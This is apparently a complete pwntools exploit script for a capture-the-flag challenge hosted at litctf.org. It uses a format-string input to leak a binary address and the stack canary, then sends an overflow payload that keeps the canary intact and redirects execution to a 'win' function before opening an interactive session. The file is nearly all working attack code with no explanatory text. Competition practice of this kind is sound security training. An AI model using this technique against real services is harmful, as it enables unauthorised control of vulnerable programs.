from pwn import *
elf = context.binary = ELF("./s")
r = elf.process()

# gdb.attach(r,'''
#     b*vuln+56\n
#     b*vuln+88\n
#     c
# ''')
r = remote("litctf.org", 31791)
r.sendline(b"%13$p%11$p")
elf_leak = int(r.recv(14),16)
canary = int(r.recv(18),16)
elf.address = elf_leak - 4782
log.success(f"ELF leak: {hex(elf.address)}")
log.success(f"CANARY: {hex(canary)}")
payload = b"A" * 40 + p64(canary) + p64(0x1) + p64(elf.sym.vuln+115) + p64(elf.sym.win)
r.sendline(payload)
r.interactive()